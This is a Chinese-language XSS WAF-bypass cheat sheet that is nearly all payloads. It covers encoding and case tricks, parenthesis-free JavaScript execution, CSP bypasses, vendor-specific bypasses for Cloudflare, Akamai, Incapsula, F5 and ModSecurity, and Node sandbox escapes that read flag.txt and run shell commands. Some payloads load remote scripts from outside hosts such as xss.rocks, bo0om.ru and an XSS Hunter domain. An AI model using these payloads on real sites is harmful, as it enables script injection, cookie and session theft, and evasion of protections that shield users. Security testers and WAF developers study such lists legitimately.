## WAF绕过

### 黑名单绕过

```javascript
//随机大小写
<script> --> <ScrIpT>
<img --> <ImG

//双标签
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//替换空格分隔属性
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//父标签
<svg><x><script>alert('1'&#41</x>

//奇怪属性
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///注意换行符
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//不关闭标签， " <" 或 " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//额外打开
<<script>alert("XSS");//<</script>

//编写奇怪的标签
<</script/script><script>
<input type=image src onerror="prompt(1)">

//使用 `` 代替括号
onerror=alert`1`

//使用多个标签
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```

### 不带括号

[我括号呢](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/XSS/Without-Parentheses.md)

### 长度绕过

[terjanq](https://tinyxss.terjanq.me/)

[Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)

### 绕过内部事件

```javascript
<a id="author" href="http://none" onclick="var tracker='http://foo?
&apos;-alert(1)-&apos;
';">Go Back </a>
```

```javascript
//HTML实体
&apos;-alert(1)-&apos;
//HTML十六进制
&#x27-alert(1)-&#x27
//HTML十六进制
&#x00027-alert(1)-&#x00027
//HTML十进制
&#39-alert(1)-&#39
//HTML十进制
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>

URL编码
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>

Unicode编码
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```

### 事件处理程序绕过

```javascript
<svg onload%09=alert(1)> //safari不可用
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//onevent和"="之间可以使用的字符
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```

### 隐藏输入和元标记

隐藏输入
```javascript
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```

元标记
```javascript
元属性内注入
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />

现有目标内注入
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```

### JavaScript绕过黑名单

字符串
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```

特殊字符
```javascript
'\b' //退格
'\f' //换页
'\n' //换行
'\r' //回车
'\t' //tab
```

空格替换
```javascript
<TAB>
/**/
```

JavaScript注释
```javascript
//1行注释
/*多行注释*/
<!--1行注释
#!一行注释, "#!"必须为一行开头
-->一行注释， "-->"必须为一行开头
```

新行
```javascript
//JavaScript将这些字符串解释为换行
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```

空格
```javascript
log=[];
function funct(){}
  for(let i=0;i<=0x10ffff;i++){
      try{
        eval(`funct${String.fromCodePoint(i)}()`);
        log.push(i);
      }
      catch(e){}
  }
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279
//可以使用原始字符，如果出现在svg或HTML属性中需要对其HTML编码
<img/src/onerror=alert&#65279;(1)>
```

注释中的JavaScript
```javascript
//需要用户打开DevTools
//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```

JavaScript不带括号
```javascript
//通过设置 location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
//或者任何DOM XSS接收器，例如location=name

//将字符串作为数值为1的字符传递
alert`1`

//反向提示 + 标记模板 + call/apply
eval`alert\x281\x29` //不会起作用，因为它只会返回传递的数组
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

//传递多个参数
function btt(){
    console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//构造一个函数并调用
Function`x${'alert(1337)'}x```

//替换可以使用正则表达式并在发现某些内容时调用
"a,".replace`a${alert}` //初始["a"] 作为 "a"传递给str
"a".replace.call`1${/./}${alert}`

"a".replace.call`1337${/..../}${alert}` //alert 1337

//使用 Reflect.apply 调用具有任何参数的任何函数
Reflect.apply.call`${alert}${window}${[1337]}`
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
//使用 Reflect.set 调用任意值设置为变量
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}`

//当对象用作原语时，会调用这些操作.因为这些对象是作为this传递的,而alert()需要windows作为this的值,所以windows方法是用过的
valueOf=alert;window+''
toString=alert;window+''


//错误处理程序
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //不使用";"
onerror=alert //不使用";"创建新行
throw 1337
// 错误处理程序 + 特殊Unicode分隔符
eval("onerror=\u2028alert\u2029throw 1337");
//错误处理程序 + 逗号分隔符遍历列表并仅返回最后一个元素
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 //将onerror设置为警报后，弹出1337
throw onerror=alert,1,1,1,1,1,1337
//catch子句中的可选异常变量
try{throw onerror=alert}catch{throw 1}


//有实例符号
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
```

任意函数调用

```javascript
//类似eval的函数
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//通用函数执行
`` //可以用作括号
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```

### 其它绕过

PHP FILTER_VALIDATE_EMAIL绕过
```javascript
"><svg/onload=confirm(1)>"@x.y
```

Ruby-On-Rails绕过
```javascript
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```

特殊组合
```javascript
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```

XSS脚本类型
```javascript
<script type="???"></script>
```

XS越狱
```javascript
//eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

//使用with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
//替换console.log(1)为执行的XSS语句，例如return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//最终解决方案
with(
  /with(String)
    with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
      with(mainModule)
        with(require(k))
          return(String(readFileSync(n)))
  /)
with(this)
  with(constructor)
    constructor(source)()
```

使用import()
```javascript
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```

requrie间接访问
```javascript
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
```

```javascript
try {
	null.f()
} catch (e) {
	TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
	const oldStackTrace = Error.prepareStackTrace
	try {
		Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
		Error.captureStackTrace(this)
		this.stack
	} finally {
		Error.prepareStackTrace = oldStackTrace
	}
}
function trigger() {
	const err = new CustomError()
	console.log(err.stack[0])
	for (const x of err.stack) {
		const fn = x.getFunction()
		console.log(String(fn).slice(0, 200))
		console.log(fn?.arguments)
		console.log('='.repeat(40))
		if ((args = fn?.arguments)?.length > 0) {
			req = args[1]
			console.log(req('child_process').execSync('id').toString())
		}
	}
}
trigger()
```

### 不使用引号

```javascript
没有事件处理程序
<object data=javascript:confirm()>
<a href=javascript:confirm()>click here
<script src=//14.rs></script>
<script>confirm()</script>

没有空格
<svg/onload=confirm()>
<iframe/src=javascript:alert(1)>

没有/
<svg onload=confirm()>
<img src=x onerror=confirm()>

没有=
<script>confirm()</script>

没有>
<svg onload=confirm()//

没有警报、确认、提示
<script src=//14.rs></script>
<svg onload=co\u006efirm()>
<svg onload=z=co\u006efir\u006d,z()>

没有有效的HTML标签
<x onclick=confirm()>click here
<x ondrag=aconfirm()>drag it

绕过标签黑名单
</ScRipT>
</script
</script/>
</script x>
```

### 过滤器绕过和外来有效负载

绕过区分大小写
```javascript
<sCrIpt>alert(1)</ScRipt>
```

绕过标签黑名单
```javascript
<script x>
<script x>alert('XSS')<script y>
```

通过代码评估绕过单词黑名单
```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

绕过不完整的HTML标签
```javascript
<img src='1' onerror='alert(0)' <
```

绕过字符串的引号
```javascript
String.fromCharCode(88,83,83)
```

绕过脚本标签中的引号
```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

绕过mousedown事件中的引号
```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```

.绕过
```javascript
<script>window['alert'](document['domain'])</script>

IP地址转换成十进制格式
http://192.168.1.1 == http://3232235777

Base64编码
<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
```

绕过字符串的括号
```javascript
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

绕过括号和分号
```javascript
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

绕过on黑名单
```javascript
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>

<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />

<img src='1' onerror/=alert(0) />
```

绕过空格过滤
```javascript
<img/src='1'/onerror=alert(0)>

<svgonload=alert(1)>

$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```

绕过电子邮件过滤
```javascript
"><svg/onload=confirm(1)>"@x.y
```

绕过文档黑名单
```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
window["doc"+"ument"]
```

绕过document.cookie黑名单
```javascript
window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
```

在字符串中使用JavaScript绕过
```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

使用另一种重定向方式绕过
```javascript
location="http://ghostwolflab.com"
document.location = "http://ghostwolflab.com"
document.location.href="http://ghostwolflab.com"
window.location.assign("http://ghostwolflab.com")
window['location']['href']="http://ghostwolflab.com"
```

使用替代方式绕过
```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

```javascript
全局变量
Object.keys()方法返回给定对象自己的属性名称的数组，其顺序与普通循环中的顺序相同.
这意味着我们可以使用索引而不是函数名称来访问任何JavaScript函数.
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 5
然后调用警报
Object.keys(self)[5]
// "alert"
self[Object.keys(self)[5]]("1") // alert("1")
使用正则表达找到alert
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}}
self[Object.keys(self)[a()]]("1") // alert("1")
仅一行
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
```

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

```javascript
使用替代方式绕过以触发警报
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

不使用任何东西绕过>
```javascript
<svg onload=alert(1)//
```

使用<>绕过<>
```javascript
Unicod 字符 U+FF1C 和 U+FF1E
＜script/src=//evil.site/poc.js＞
```

绕过;使用另一个字符
```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

使用HTML编码绕过
```javascript
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```

使用ECMAScripy6绕过
```javascript
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
```

使用八进制编码绕过
```javascript
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

使用UTF-7绕过
```javascript
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

使用UTF-8绕过
```javascript
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
```

使用UTF-16be绕过
```javascript
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```

使用UTF-32绕过
```javascript
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

BOM绕过
```javascript
BOM Character for UTF-16 Encoding:
Big Endian : 0xFE 0xFF
Little Endian : 0xFF 0xFE
XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

BOM Character for UTF-32 Encoding:
Big Endian : 0x00 0x00 0xFE 0xFF
Little Endian : 0xFF 0xFE 0x00 0x00
XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

使用奇怪的编码或本机解释绕过
```javascript
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
```

Google Jsonp绕过CSP
```javascript
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```

绕过CSP
```javascript
//适用于Content-Security-Policy: default-src 'self' 'unsafe-inline';
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);

//使用inline和eval绕过CSP
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)

//适用于script-src self
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

//适用于script-src 'self' data:
<script src="data:,alert(1)">/</script>
```

### 常见WAF绕过

```javascript
Cloudflare
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
<svg/OnLoad="`${prompt``}`">
<svg/onload=%26nbsp;alert`bohdan`+
1'"><img/src/onerror=.1|alert``>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>

Chrome
</script><svg><script>alert(1)-%26apos%3B

Incapsula
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<svg onload\r\n=$.globalEval("al"+"ert()");>

Akamai
?"></script><base%20c%3D=href%3Dhttps:\mysite>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
<SCr%00Ipt>confirm(1)</scR%00ipt>

WordFence
<a href=javas&#99;ript:alert(1)>

Fortiweb
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e

F5 Big IP
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="[JS-F**k Payload]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">

Barracuda
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

PHP-IDS
<svg+onload=+"[DATA]"
<svg+onload=+"aler%25%37%34(1)"

Mod-Security
<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>

Quick Defense
<input type="search" onsearch="aler\u0074(1)">
<details ontoggle="aler\u0074(1)">

Sucuri
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4

AndularJS
{{constructor.constructor(alert 1 )()}}
```



### 编码

|HTML|Char|数字|十六进制|CSS (ISO)|JS (八进制)|URL编码|
|----|----|-------|----|--------|----------|---|
|`&quot;`|"|`&#34;`|u+0022|\0022|\42|%22|
|`&num;`|#|`&#35;`|u+0023|\0023|\43|%23|
|`&dollar;`|$|`&#36;`|u+0024|\0024|\44|%24|
|`&percnt;`|%|`&#37;`|u+0025|\0025|\45|%25|
|`&amp;`|&|`&#38;`|u+0026|\0026|\46|%26|
|`&apos;`|'|`&#39;`|u+0027|\0027|\47|%27|
|`&lpar;`|(|`&#40;`|u+0028|\0028|\50|%28|
|`&rpar;`|)|`&#41;`|u+0029|\0029|\51|%29|
|`&ast;`|*|`&#42;`|u+002A|\002a|\52|%2A|
|`&plus;`|+|`&#43;`|u+002B|\002b|\53|%2B|
|`&comma;`|,|`&#44;`|u+002C|\002c|\54|%2C|
|`&minus;`|-|`&#45;`|u+002D|\002d|\55|%2D|
|`&period;`|.|`&#46;`|u+002E|\002e|\56|%2E|
|`&sol;`|/|`&#47;`|u+002F|\002f|\57|%2F|
|`&colon;`|:|`&#58;`|u+003A|\003a|\72|%3A|
|`&semi;`|;|`&#59;`|u+003B|\003b|\73|%3B|
|`&lt;`|<|`&#60;`|u+003C|\003c|\74|%3C|
|`&equals;`|=|`&#61;`|u+003D|\003d|\75|%3D|
|`&gt;`|>|`&#62;`|u+003E|\003e|\76|%3E|
|`&quest;`|?|`&#63;`|u+003F|\003f|\77|%3F|
|`&commat;`|@|`&#64;`|u+0040|\0040|\100|%40|
|`&lsqb;`|\[|`&#91;`|u+005B|\005b|\133|%5B|
|`&bsol;`|&bsol;|`&#92;`|u+005C|\005c|\134|%5C|
|`&rsqb;`|]|`&#93;`|u+005D|\005d|\135|%5D|
|`&Hat;`|^|`&#94;`|u+005E|\005e|\136|%5E|
|`&lowbar;`|_|`&#95;`|u+005F|\005f|\137|%5F|
|`&grave;`|\`|`&#96;`|u+0060|\0060|\u0060|%60|
|`&lcub;`|{|`&#123;`|u+007b|\007b|\173|%7b|
|`&verbar;`|\||`&#124;`|u+007c|\007c|\174|%7c|
|`&rcub;`|}|`&#125;`|u+007d|\007d|\175|%7d|

### 混淆和高级绕过

[ARUEBESH.JS](https://aem1k.com/aurebesh.js/)

[UglifyJS](https://skalman.github.io/UglifyJS-online/)

[JSFuck](https://jsfuck.com/)

[jjencode](https://utf-8.jp/public/jjencode.html)

[aaencode](https://utf-8.jp/public/aaencode.html)

[XSS过滤器规避备忘单](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-tab)
